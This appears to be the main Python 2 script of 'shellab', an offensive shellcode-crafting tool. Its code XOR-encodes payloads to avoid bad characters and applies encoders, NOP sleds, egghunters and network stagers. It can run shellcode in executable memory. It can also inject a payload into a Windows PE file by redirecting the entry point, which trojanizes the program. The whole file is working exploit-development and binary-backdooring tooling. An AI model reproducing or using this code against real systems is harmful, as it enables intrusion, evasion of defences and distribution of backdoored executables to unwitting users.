#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

import argparse
import binascii
from commands import getoutput
import lib.logs as logs
import lib.nops as nops
import lib.wrappers as wrappers
from lib.stagers import *
from lib.egg import eggs
from terminaltables import SingleTable
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import os
import importlib
import textwrap
import random
import struct as s
from pefile import PE, PEFormatError
from string import ascii_uppercase, ascii_lowercase
import re
import json

PATH = __file__.replace('./shellab.py', '')
print PATH

class WrongShellcodeFormat(Exception):
    pass
class WrongFormatName(Exception):
    pass
class WrongEncoderName(Exception):
    pass
class WrongEgghunterName(Exception):
    pass
class NonCompatibleEncoder(Exception):
    pass


def split_to_chunks(s, count):
    return [''.join(x) for x in zip(*[list(s[z::count]) for z in range(count)])]

def raw_asm(instr, bits, platform):
    op = getoutput(('rasm2 -a x86 -b {} -k {} "{}"'.format(bits,platform,instr)))
    return op

def raw_disasm(opcodes, bits, platform):
    instr = getoutput(('rasm2 -s intel -a x86 -b {} -k {} -d {}'.format(bits,platform,opcodes)))
    return instr

def int_to_hex(integer, endian):
    if endian == 'little':
        en = '<I'
    elif endian == 'big':
        en = '>I'
    hx = ''.join(x.encode('hex') for x in s.pack(en, integer)).replace('00', '')
    hx = ''.join([binascii.unhexlify(op) for op in split_to_chunks(hx,2)])
    return hx

def remove_badchars(scode, badchars):
    def encoded(scode, key):
            result = ''
            for char in scode:
                result += chr(ord(char)^ord(key))
            return result
    def generate_key():
        return chr(random.choice(range(1,255)))
    badchars = split_to_chunks(badchars.replace('x', '').replace('//', ''),2)
    badchars = [binascii.unhexlify(op) for op in badchars]
    stub = '\xeb\x09\x5e\x80\x36XOR_KEY\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff'
    for badchar in badchars:
        while badchar in scode:
            key = generate_key()
            scode = encoded(scode, key)
            scode = stub.replace('XOR_KEY', key) + scode + key
    return scode

def list_all():
    print '\n{}ENCODERS{}'.format(logs.bold(logs.purple('>>')),logs.bold(logs.purple('<<')))
    table_data = [['--NAME--', '--ARCH--', '--DESCRIPTION--', '--RANK--']]
    encoders = []
    for enc in os.walk(PATH+'encoders'):
        encoders.append(enc)
    encoders = encoders[0][2]
    cdrs = []
    for enc in encoders:
        if ('init' in enc or '.pyc' in enc):
            pass
        else:
            cdrs.append(enc.replace('.py', ''))
    for encoder in cdrs:
        try:
            encoder = importlib.import_module('encoders.'+encoder).Encoder()
            if encoder.rank == 'unstable':
                rank = logs.red('UNSTABLE')
            if encoder.rank == 'manual':
                rank = logs.yellow('MANUAL')
            elif encoder.rank == 'good':
                rank = logs.green('GOOD')
            elif encoder.rank == 'excellent':
                rank = logs.blue('EXCELLENT')
        except:
            rank = 'N/A'
        table_data.append([encoder.name, encoder.arch, encoder.description, rank])
    table_instance = SingleTable(table_data) 
    table_instance.inner_heading_row_border = True
    table_instance.inner_row_border = False
    table_instance.justify_columns = {0: 'left', 1: 'left', 2: 'left'}
    print table_instance.table

    print '\n{}EGGHUNTERS{}'.format(logs.bold(logs.purple('>>')),logs.bold(logs.purple('<<')))
    table_data = [['--NAME--', '--PLATFORM--', '--SIZE--', '--EGG SIZE--']]
    for egg in eggs:
        table_data.append([egg, eggs[egg][1],'{} bytes'.format(eggs[egg][2]),'{} bytes'.format(eggs[egg][3])])
    table_instance = SingleTable(table_data) 
    table_instance.inner_heading_row_border = True
    table_instance.inner_row_border = False
    table_instance.justify_columns = {0: 'left', 1: 'left', 2: 'left'}
    print table_instance.table

    print '\n{}FORMATS{}'.format(logs.bold(logs.purple('>>')),logs.bold(logs.purple('<<')))
    table_data = [['--FORMAT--', '--DESCRIPTION--']]
    for func in dir(wrappers):
        if "format_"  in func:
            table_data.append([func.replace("format_", ''), eval("wrappers.{}".format(func)).__doc__])
    table_instance = SingleTable(table_data) 
    table_instance.inner_heading_row_border = True
    table_instance.inner_row_border = False
    table_instance.justify_columns = {0: 'left', 1: 'left', 2: 'left'}
    print table_instance.table

def arguments():
    parser = argparse.ArgumentParser(prog='shelab')
    parser.add_argument('SHELLCODE', nargs='?',help='Shellcode in "\\x" escaped form or raw bytes')
    parser.add_argument('-in', '--info', action='store_true',
                        dest='INFO',
                        help='Show shellcode info')
    parser.add_argument('-a', action='store',
                        choices=['x86', 'x64'],
                        dest='ARCH', default='x86',
                        metavar='<architecture>',
                        help='Specify architecture of the shellcode (default: x86)')
    parser.add_argument('-p', action='store',
                        dest='PLATFORM', choices=['linux', 'windows', 'osx'],
                        metavar='<platform>',
                        default='linux',
                        help='Specify the platform (default: linux)')
    parser.add_argument('--endian', action='store',
                        dest='ENDIAN', choices=['little','big'],
                        metavar='<endian>',
                        default='little',
                        help='Specify the endianess (default: little)')
    parser.add_argument('-bc', action='store',
                        dest='BADCHARS', default='00',
                        metavar='<badchars>',
                        help='Characters to avoid in generated shellcode (default: "\\x00")')
    parser.add_argument('--preserve', action='store',
                        dest='PRESERVE',
                        metavar='<register1,register2...>',
                        help='Preserve values of certain registers')
    parser.add_argument('--prepend', action='store',
                        dest='PREPEND', nargs='+',
                        metavar='<instructions>',
                        help='Prepend shellcode with additional instructions, divided by "/"')
    parser.add_argument('--append', action='store',
                        dest='APPEND', nargs='+',
                        metavar='<instructions>',
                        help='Append additional instructions to shellcode, divided by "/"')
    parser.add_argument('--fork', action='store_true',
                        dest='FORK',
                        help='Prepend shellcode with a fork() syscall (Linux only)')
    parser.add_argument('--exit', action='store_true',
                        dest='EXIT',
                        help='Append shellcode with an exit() syscall (Linux only)')
    parser.add_argument('-l', '--list', action='store_true',
                        dest='LIST',
                        help='List all encoders, egghunters, formats and architectures')
    parser.add_argument('-en', action='store',
                        dest='ENCODER', metavar='<encoder>',
                        help='Encode the shellcode with chosen encoder')
    parser.add_argument('-i',action='store',
                        type=int, default=1,
                        dest='ITERATIONS', metavar='<n>',
                        help='Number of encoding loops (default: 1)')
    parser.add_argument('-f', action='store',
                        dest='FORMAT', metavar='<format>',
                        default='hex',
                        help='Output format of a shellcode (default: hex)')
    parser.add_argument('-o', action='store',
                        dest='OUTPUT', metavar='<filename>',
                        help='Save the payload in a file')
    parser.add_argument('-n',action='store',
                        type=int,
                        dest='NOPS', metavar='<length>',
                        help='Prepend payload with nopsled of given length')
    parser.add_argument('--nop-insert',action='store',
                        type=int, metavar='<n>',
                        dest='NOP_INSERT',
                        help='Insert NOP instruction between every <n> bytes of shellcode')
    parser.add_argument('-nc',action='store_true',
                        dest='NON_CANONICAL',
                        help='Use non-canonical, random nopsled instead of default NOP opcodes')
    parser.add_argument('--padd',action='store',   
                        type=int, metavar='<size>',
                        dest='PADD',
                        help='Padd shellcode with nops until it reaches length given by <size>')
    parser.add_argument('--ptrn',action='store',   
                        type=int, metavar='<length>',
                        dest='PATTERN',
                        help='Prepend shellcode with cyclic De Brujin pattern')
    parser.add_argument('--run',action='store_true',   
                        dest='RUN',
                        help='Run generated shellcode (works only for Linux)')
    parser.add_argument('--pure',action='store_true',   
                        dest='PURE',
                        help='Print only pure, formatted payload on output, without any additional text or summary')
    parser.add_argument('--reduce',action='store_true',   
                        dest='REDUCE',
                        help='Try to reduce the length of the shellcode by instructions replacement')
    parser.add_argument('--stager',action='store_true',   
                        dest='STAGER',
                        help='Generate a stager payload')
    parser.add_argument('--stager-port',action='store',
                        type=int,dest='STAGER_PORT',
                        default=4444,
                        help='Port of the stager to listen on for incoming second stage shellcode (default: 4444)')
    parser.add_argument('-e', action='store',
                        dest='EGGHUNTER', metavar='<egghunter>',
                        help='Generate an egghunter for currently loaded shellcode.')
    parser.add_argument('--append-egg', action='store_true',
                        dest='APPEND_EGG', 
                        help='Append the egghunter to the shellcode instead of printing it')
    parser.add_argument('-t', action='store',
                        dest='TAG', metavar='<tag>',
                        default='wOOt',
                        help='Tag for the egghunter (default: "wOOt")')
    parser.add_argument('-inj', action='store',
                        dest='BINARY', metavar='<binary>',
                        help='Inject the payload into a binary file (currently supported only for Windows PE fileformat)')
    res = parser.parse_args()
    if res.LIST:
        list_all()
    elif not res.SHELLCODE:
        parser.error('"SHELLCODE" argument is required')
    return res


def main():
    res = arguments()
    scode = split_to_chunks(res.SHELLCODE.replace('x', ''),2)
    bits = '32'
    summary = []
    prim_length = len(scode)
    if res.ARCH == 'x64':
        bits = '64'
    try:
        scode = ''.join([binascii.unhexlify(op) for op in scode])
    except TypeError:
        raise WrongShellcodeFormat

    if res.REDUCE:
        opcodes = ''.join([binascii.hexlify(op) for op in scode])
        instrs = raw_disasm(opcodes, bits, res.PLATFORM).splitlines()
        new_instrs = []
        index = 0
        for i in instrs:
            if re.search('mov (.*), 0', i):
                reg = re.search('mov (.*), 0', i).group(1)
                new_instrs.append('xor {}, {}'.format(reg, reg))
            elif re.search('add (.*), 1', i):
                reg = re.search('add (.*), 1', i).group(1)
                new_instrs.append('inc {}'.format(reg))
            elif re.search('add (.*), 2', i):
                reg = re.search('add (.*), 2', i).group(1)
                new_instrs.append('inc {}, inc {}'.format(reg, reg))
            elif re.search('mov (.*), (.*)', i):
                dst = re.search('mov (.*), (.*)', i).group(1)
                src = re.search('mov (.*), (.*)', i).group(2)
                if src not in res.PRESERVE:
                    new_instrs.append('xchg {}, {}'.format(dst,src))
            else:
                new_instrs.append(i)
            index += 1
        scode = binascii.unhexlify(''.join([raw_asm(i, bits, res.PLATFORM) for i in new_instrs]))

    if res.APPEND:
        ops = ''
        instrs = ' '.join(res.APPEND).split('/')
        for i in instrs:
            ops += binascii.unhexlify(raw_asm(i, bits, res.PLATFORM))
        scode = scode + ops

    if res.PREPEND:
        ops = ''
        instrs = ' '.join(res.PREPEND).split('/')
        for i in instrs:
            ops += binascii.unhexlify(raw_asm(i, bits, res.PLATFORM))
        scode = ops + scode

    if res.FORK:
        if res.PLATFORM == 'linux':
            forks = {'x86':'\x31\xc0\x40\x40\xcd\x80',
                     'x64':'\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\xcd\x80'}
            scode = remove_badchars(forks[res.ARCH],res.BADCHARS) + scode
            summary.append(logs.good('Added fork syscall',prnt=False))
        else:
            summary.append(logs.err('Unable to add fork syscall: supported only for Linux',prnt=False))

    if res.EXIT:
        if res.PLATFORM == 'linux':
            exits = {'x86':'\x31\xc0\x40\x31\xdb\xcd\x80',
                     'x64':'\x48\x31\xc0\x48\xff\xc0\x48\x31\xdb\xcd\x80'}
            scode = scode + remove_badchars(exits[res.ARCH], res.BADCHARS)
            summary.append(logs.good('Added exit syscall', prnt=False)) 
        else:
            summary.append(logs.err('Unable to add exit syscall: supported only for Linux',prnt=False))

    if res.ENCODER:
        counter = 0
        try:   
            encoder = importlib.import_module('encoders.'+res.ENCODER).Encoder()
        except ImportError:
            raise WrongEncoderName
        if res.ARCH not in encoder.arch:
            raise NonCompatibleEncoder
        while counter < res.ITERATIONS:
            stub = encoder.encode(scode)[0]
            encoded = encoder.encode(scode)[1]
            scode = stub + encoded
            counter += 1
        encoded_len = len(scode) + len(stub)
        summary.append(logs.good('Encoded payload with {} encoder {} times'.format(encoder.name,res.ITERATIONS),prnt=False))
        #scode = scode.split()
        #print ''.join([binascii.hexlify(op) for op in scode])

    if res.BADCHARS:
        scode = remove_badchars(scode, res.BADCHARS)
        summary.append(logs.good('Removed badchars',prnt=False))

    if res.BINARY:
        def inject():
            class NotEnoughSize(Exception):
                pass

            exe_file = res.BINARY
            final_pe_file = '{}_injected'.format(res.BINARY)
            shellcode = scode
            pe = PE(exe_file)
            OEP = pe.OPTIONAL_HEADER.AddressOfEntryPoint
            pe_sections = pe.get_section_by_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
            align = pe.OPTIONAL_HEADER.SectionAlignment
            what_left = (pe_sections.VirtualAddress + pe_sections.Misc_VirtualSize) - pe.OPTIONAL_HEADER.AddressOfEntryPoint
            end_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint + what_left
            padd = align - (end_rva % align)
            e_offset = pe.get_offset_from_rva(end_rva+padd) - 1
            scode_size = len(shellcode)+7
            if padd < scode_size:
                summary.append(logs.err('Not enough size for shellcode injection',prnt=False))
            else:
                #logs.good('Found {} bytes of empty space'.format(padd))
                scode_end_off = e_offset
                scode_start_off = scode_end_off - scode_size
                pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.get_rva_from_offset(scode_start_off)
                raw_pe_data = pe.write()
                jmp_to = OEP - pe.get_rva_from_offset(scode_end_off)
                pusha = '\x60'
                popa = '\x61'
                shellcode = '%s%s%s\xe9%s' % (pusha, shellcode, popa, pack('I', jmp_to & 0xffffffff))
                final_data = list(raw_pe_data)
                final_data[scode_start_off:scode_start_off+len(shellcode)] = shellcode
                final_data = ''.join(final_data)
                raw_pe_data = final_data
                pe.close()
                new_file = open(final_pe_file, 'wb')
                new_file.write(raw_pe_data)
                new_file.close()
                summary.append(logs.good('Succesfully injected shellcode',prnt=False))

        if res.PLATFORM == 'windows':
            try:
                inject()
            except PEFormatError:
                summary.append(logs.err('Unable to inject shellcode: executable is not Windows PE format',prnt=False))
        else:
            summary.append(logs.err('Unable to inject shellcode: supported only for Windows',prnt=False))

    if res.NOPS:
        nop_generator = eval('nops.{}'.format(res.ARCH))
        scode = nop_generator(res.NOPS, res.NON_CANONICAL) + scode
        summary.append(logs.good('Prepended shellcode with NOP instructions', prnt=False))

    if res.PADD:
        nop_generator = eval('nops.{}'.format(res.ARCH))
        nop = nop_generator(1, False)
        while len(scode) < res.PADD:
            scode += nop
        summary.append(logs.good('Padded shellcode with NOP instructions',prnt=False))

    if res.STAGER:
        stager_port = int_to_hex(res.STAGER_PORT, res.ENDIAN)
        stager = eval('stager_{}_{}'.format(res.PLATFORM, res.ARCH)).replace('PORT', stager_port)
        stager = remove_badchars(stager, res.BADCHARS)
        stager = '\\x' + '\\x'.join([binascii.hexlify(op) for op in stager])
        stager = '\n'.join(textwrap.wrap(stager, 32))
        if not res.PURE:
            print '\n{} ({} bytes):'.format(logs.purple(logs.bold('STAGER')), len(stager)/4)
            print stager

    if res.RUN:
        libc = CDLL('libc.so.6')
        sc = c_char_p(scode)
        size = len(scode)
        addr = c_void_p(libc.valloc(size))
        memmove(addr, sc, size)
        libc.mprotect(addr, size, 0x7)
        run = cast(addr, CFUNCTYPE(c_void_p))
        run()

    if res.NOP_INSERT:
        nop_generator = eval('nops.{}'.format(res.ARCH))
        nop = nop_generator(1, False)
        block_size = res.NOP_INSERT
        if len(scode)%block_size != 0:
            scode += nop
        scode = split_to_chunks(scode, block_size)
        scode = nop.join(scode)
        summary.append(logs.good('Inserted NOPs between every {} bytes of shellcode'.format(res.NOP_INSERT),prnt=False))

    if res.EGGHUNTER:
        clear_tag = res.TAG
        badchars = split_to_chunks(res.BADCHARS.replace('x', '').replace('//', ''),2)
        badchars = [binascii.unhexlify(op) for op in badchars]
        for badchar in badchars:
            while badchar in clear_tag:
                clear_tag = ''.join(random.choice(ascii_lowercase) for i in range(4))
        try:
            egg, modified_payload = eggs[res.EGGHUNTER][0](tag=clear_tag, payload=scode)
        except:
            raise WrongEgghunterName
        egg = remove_badchars(egg, res.BADCHARS)
        scode = modified_payload
        summary.append(logs.good('Added tag to shellcode',prnt=False))
        if res.APPEND_EGG:
            scode = egg + scode
            summary.append(logs.good('Appended egghunter to payload',prnt=False))
        else:    
            raw_egg = []
            egg_escaped = []
            for op in egg:
                raw_egg.append(binascii.hexlify(op))
            for op in raw_egg:
                egg_escaped.append('\\x'+op)
            egg = ''.join(egg_escaped)
            egg = '\n'.join(textwrap.wrap(egg, 32))
            if not res.PURE:
                print '\n{} ({} bytes):'.format(logs.purple(logs.bold('EGGHUNTER')), len(egg)/4)
                print egg


    if res.INFO:
        if not res.PURE:
            print '\n{}:'.format(logs.bold(logs.purple('INFO')))
            print '| Length: {}'.format(len(scode))
            nullbytes = scode.count('\x00')
            if nullbytes == 0:
                nullbytes = logs.green(nullbytes)
            else:
                nullbytes = logs.red(nullbytes)
            print '| Null bytes: {}'.format(nullbytes)
            print '| Nops: {}'.format(logs.purple(scode.count('\x90')))
            print '| Returns: {}'.format(scode.count('\xc3'))
            print '| Interrupts: {}'.format(logs.yellow(scode.count('\xcc')))
            print '| System calls: {}'.format(logs.bold(scode.count('\xcd\x80')))

    if res.PATTERN:
        def generate_pattern(length):
            digits='0123456789'
            pattern = ''
            for upper in ascii_uppercase:
                for lower in ascii_lowercase:
                    for digit in digits:
                        if len(pattern) < length:
                            pattern += upper+lower+digit
                        else:
                            pattern = pattern[:length]
            return pattern
        scode = generate_pattern(res.PATTERN) + scode
        summary.append(logs.good('Prepended shellcode with cyclic pattern',prnt=False))

    if not res.PURE:
        print '\n{}:'.format(logs.purple(logs.bold('SUMMARY')))
        for s in summary:
            print s

    if res.FORMAT:
        scode_len = len(scode)
        try:
            formatted = eval('wrappers.format_{}'.format(res.FORMAT))(scode)
        except AttributeError:
            raise WrongFormatName
        if res.OUTPUT:
            out_file = open(res.OUTPUT, 'w')
            out_file.write(formatted)
            out_file.close()
            summary.append(logs.good('Saved shellcode as {}'.format(res.OUTPUT), prnt=False))
        else:
            if not res.PURE:
                print '\n{} ({} bytes of shellcode):'.format(logs.purple(logs.bold('FINAL PAYLOAD')), scode_len)
            print formatted

    

if __name__ == '__main__':
    res = arguments()
    if not res.LIST:
        try:
            main()
        except WrongShellcodeFormat:
            logs.err('Wrong shellcode format on input')
        except WrongFormatName:
            logs.err('Wrong output format name')
        except WrongEgghunterName:
            logs.err('Wrong egghunter name')
        except WrongEncoderName:
            logs.err('Wrong encoder name')
        except NonCompatibleEncoder:
            logs.err('Encoder not compatible with current architecture')
